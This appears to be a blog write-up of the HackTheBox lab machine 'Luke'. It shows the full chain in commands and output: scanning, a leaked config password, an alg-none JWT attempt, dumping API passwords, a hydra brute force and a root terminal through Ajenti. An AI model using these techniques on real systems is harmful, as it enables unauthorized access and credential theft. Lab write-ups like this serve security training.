---
title: HTB: Luke
url: https://0xdf.gitlab.io/2019/09/14/htb-luke.html
date: 2019-09-14T13:45:00+00:00
difficulty: Medium [30]
tags: hackthebox, ctf, htb-luke, nmap, gobuster, credentials, api, nodejs, jwt, wfuzz, ajenti, hydra
---

![Luke](https://0xdfimages.gitlab.io/img/luke-cover.png)

Luke was a recon heavy box. In fact, the entire writeup for Luke could reasonably go into the Recon section. I’m presented with three different web interfaces, which I enumerate and bounce between to eventually get credentials for an Ajenti administrator login. Once I’m in Ajenti, I have access to a root shell, and both flags.

## Box Info

| Name | [Luke](https://hackthebox.com/machines/luke)  [Luke](https://hackthebox.com/machines/luke) [Play on HackTheBox](https://hackthebox.com/machines/luke) |
| --- | --- |
| Release Date | [25 May 2019](https://twitter.com/hackthebox_eu/status/1131540674359234561) |
| Retire Date | 14 Sep 2019 |
| OS | FreeBSD FreeBSD |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Luke |
| Radar Graph | Radar chart for Luke |
| First Blood User | 01:03:06[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 01:08:24[Layle Layle](https://app.hackthebox.com/users/7533) |
| Creator | [H4d3s H4d3s](https://app.hackthebox.com/users/564) |

## Recon

### nmap

`nmap` shows several ports, ftp (21), ssh (22), and three http (80, 3000, and 8000):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap_alltcp 10.10.10.137
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-28 04:58 EDT
Warning: 10.10.10.137 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.137
Host is up (0.11s latency).
Not shown: 52586 filtered ports, 12944 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 67.01 seconds

root@kali# nmap -sV -sC -p 21,22,80,3000,8000 -oA scans/nmap_tcpscripts 10.10.10.137                                                                                                        
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-28 04:59 EDT
Nmap scan report for 10.10.10.137
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.20 seconds

```

Based on the Apache version, it looks like Luke is running FreeBSD, using php. I also note that Node is hosting the service on 3000, and it’s unclear what’s hosting the port 8000 service. I already have in mind that if I can get into Ajenti, I can likely get root from there, as it is an administrative control panel.

### FTP - TCP 21

`nmap` shows that anonymous login to FTP is permitted. I’ll connect and find a single file:

```

root@kali# ftp 10.10.10.137
Connected to 10.10.10.137.
220 vsFTPd 3.0.3+ (ext.1) ready...
Name (10.10.10.137:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
226 Directory send OK.
ftp> cd webapp
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
226 Directory send OK.

```

Download and take a look:

```

ftp> get for_Chihiro.txt
local: for_Chihiro.txt remote: for_Chihiro.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for for_Chihiro.txt (306 bytes).
226 Transfer complete.
306 bytes received in 0.00 secs (284.3274 kB/s)
ftp> exit
221 Goodbye.

root@kali# cat for_Chihiro.txt 
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry 

```

From this note I’ll take a hint that there are security issues in at least one of the websites, and two potential usernames, chihiro and derry.

### Website - TCP 80

#### Site

The main site is a page for Luke LTD:

![](https://0xdfimages.gitlab.io/img/luke-webroot.png)

All of the links on the page just go to other anchors on the page.

#### gobuster

Running `gobuster` revleas a bunch of new paths:

```

root@kali# gobuster -u http://10.10.10.137/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 50 -o scans/gobuster_80_root_php                                       

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.137/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/06/23 15:29:14 Starting gobuster
=====================================================
/login.php (Status: 200)
/member (Status: 301)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/config.php (Status: 200)
/LICENSE (Status: 200)
=====================================================
2019/06/23 15:31:39 Finished
=====================================================

```

#### config.php

The most interesting path is `config.php`, which give details on how to connect to the database, including the password:

```

root@kali# curl http://10.10.10.137/config.php
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
$db = "login";

$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);

```

#### /management

`/management` requests HTTP auth, and no simple guesses seem to work.

![1561319413947](https://0xdfimages.gitlab.io/img/1561319413947.png)

I’ll try the only creds I have so far, root / Zk6heYCyv6ZE9Xcg, but it doesn’t work. I’ll come back when I find some more credentials.

#### /login.php

This is a login page:

![1568361021976](https://0xdfimages.gitlab.io/img/1568361021976.png)

I tried some basic guesses, but no success.

### Website - TCP 3000

#### Site

The port 3000 http server is an API for something:

![1561318435781](https://0xdfimages.gitlab.io/img/1561318435781.png)

I can also easily interact with it over `curl`:

```

root@kali# curl http://10.10.10.137:3000
{"success":false,"message":"Auth token is not supplied"}

```

#### wfuzz

I’ll want to look for API endpoints, so I’ll use `wfuzz` to fuzz it:

```

root@kali# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.10.10.137:3000/FUZZ --hc 404                                                         
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.137:3000/FUZZ
Total requests: 2588

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000034:  C=200      0 L        2 W           13 Ch        "login"
000123:  C=200      0 L        5 W           56 Ch        "users"
001642:  C=200      0 L        2 W           13 Ch        "Login"
002099:  C=200      0 L        5 W           56 Ch        "Users"

Total time: 24.59788
Processed Requests: 2588
Filtered Requests: 2584
Requests/sec.: 105.2123

```

There’s two endpoints, `users` and `login`.

#### /users

`users` requires a token, giving the same message as the root. One attack against JWTs is to provide a token with alg none, and see if the server accepts it. It does not here. I used [jwt.io](https://jwt.io) to create the token:

![1559160844326](https://0xdfimages.gitlab.io/img/1559160844326.png)

And submitted it:

```

root@kali# curl http://10.10.10.137:3000/users -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoicm9vdCJ9.'
{"success":false,"message":"Token is not valid"}

```

#### /login

Hitting `login` asks me to auth:

```

root@kali# curl http://10.10.10.137:3000/login 
"please auth"

```

### Ajenti - TCP 8000

There’s an Ajenti login page:

![1561318822810](https://0xdfimages.gitlab.io/img/1561318822810.png)

None of the default or lazy creds seem to work, so I’ll leave this for now.

## Shell as root

### Get Users and Passwords from API

#### Find Arguments

I started with the API on 3000. I started experimenting with some POST data. I want to log in, but I don’t know what parameters the api is looking for. If I send in the wrong parameters, it says “Bad Request”:

```

root@kali# curl http://10.10.10.137:3000/login -H "Content-Type: application/json" -d '{"user":"luke","password":"password"}'                                              
Bad Request

```

When I try the combination of “username” and “password”, it says forbidden:

```

root@kali# curl http://10.10.10.137:3000/login -H "Content-Type: application/json" -d '{"username":"luke","password":"password"}'
Forbidden

```

That likely means I’ve got the right parameters.

#### Get Token

I’ve got a handful of usernames from the box so far, as well as one password from the database config. I’ll try the password from the config with various usernames, and eventually find one that works:

```

root@kali# curl http://10.10.10.137:3000/login -H "Content-Type: application/json" -d '{"username":"root","password":"Zk6heYCyv6ZE9Xcg"}'
Forbidden
root@kali# curl http://10.10.10.137:3000/login -H "Content-Type: application/json" -d '{"username":"chihiro","password":"Zk6heYCyv6ZE9Xcg"}'
Forbidden
root@kali# curl http://10.10.10.137:3000/login -H "Content-Type: application/json" -d '{"username":"derry","password":"Zk6heYCyv6ZE9Xcg"}'
Forbidden
root@kali# curl http://10.10.10.137:3000/login -H "Content-Type: application/json" -d '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}'
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MTU5OTk3LCJleHAiOjE1NTkyNDYzOTd9.a5kDgyES1Ot7qRzArdz2ehnvANv9yYdzZczG5EIISRs"}

```

With username admin it returned a token! I can use [jwt.io](https://jwt.io) to decode it:

![1559161097950](https://0xdfimages.gitlab.io/img/1559161097950.png)

#### user API

Now that I have a token, I can try to use it. Based on the error message thus far, I suspect that [this code](https://gist.github.com/narenaryan/4d03bb4ccda5bb634a3cb5c51f5e79a7) is what’s being used to validiate API requests. If that’s true, I need to put the token into a header named either `x-access-token` or `authorization`.

When I do that, I get back users (without piped in `jq` for readability):

```

root@kali# curl -s http://10.10.10.137:3000/users -H "authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4MzYwNDk0LCJleHAiOjE1Njg0NDY4OTR9.3hVk0ASf7R
fGtwbnAerIRY1V6n5TWjrETlBqg7KkCtQ" | jq .
[
  {
    "ID": "1",
    "name": "Admin",
    "Role": "Superuser"
  },
  {
    "ID": "2",
    "name": "Derry",
    "Role": "Web Admin"
  },
  {
    "ID": "3",
    "name": "Yuri",
    "Role": "Beta Tester"
  },
  {
    "ID": "4",
    "name": "Dory",
    "Role": "Supporter"
  }
]

```

I can try each user and get their password:

```

root@kali# for user in admin derry yuri dory; do curl http://10.10.10.137:3000/users/${user} -H "authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MTU5OTk3LCJleHAiOjE1NTkyNDYzOTd9.a5kDgyES1Ot7qRzArdz2ehnvANv9yYdzZczG5EIISRs"; echo; done
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
{"name":"Yuri","password":"bet@tester87"}
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}

```

### Access /management

Armed with new usernames and passwords, I’ll give the various logins another show. I’ll drop the usernames and passwords into files, and run `hydra` to try them. For `/management`, it works:

```

root@kali# hydra -L users -P passwords -s 80 -f 10.10.10.137 http-get /management
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-05-29 16:26:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 35 login tries (l:7/p:5), ~3 tries per task
[DATA] attacking http-get://10.10.10.137:80/management
[80][http-get] host: 10.10.10.137   login: Derry   password: rZ86wwLvx7jUxtch
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-05-29 16:26:14

```

Now I can access `/management`:

![1559162341909](https://0xdfimages.gitlab.io/img/1559162341909.png)

`config.php` is the same file I already saw. `login.php` is a login page. `config.json` seems to be the ajenti config:

![1559162397524](https://0xdfimages.gitlab.io/img/1559162397524.png)

The config includes a password:

![1559162422133](https://0xdfimages.gitlab.io/img/1559162422133.png)

### Ajenti Root Shell

I can log into Ajenti on port 8000 using “root” / “﻿KpMasng6S5EtTy9Z”:

![1559162467672](https://0xdfimages.gitlab.io/img/1559162467672.png)

I could do a lot of things from here. The file manager has access to the entire file system. But I’ll go with the “Terminal” Option:

![1559162527208](https://0xdfimages.gitlab.io/img/1559162527208.png)

If I hit “+ New”, a black box appears in the place of “No active terminals”. Then I click on it, and I’m at a root prompt:

![1559162825862](https://0xdfimages.gitlab.io/img/1559162825862.png)

I can grab both flags:

```

# id
uid=0(root) gid=0(wheel) groups=0(wheel)                                   
# cd /root
# cat root.txt
84483430...
# cd /home
# ls
derry
# cd derry/
# cat user.txt
58d441e5...

```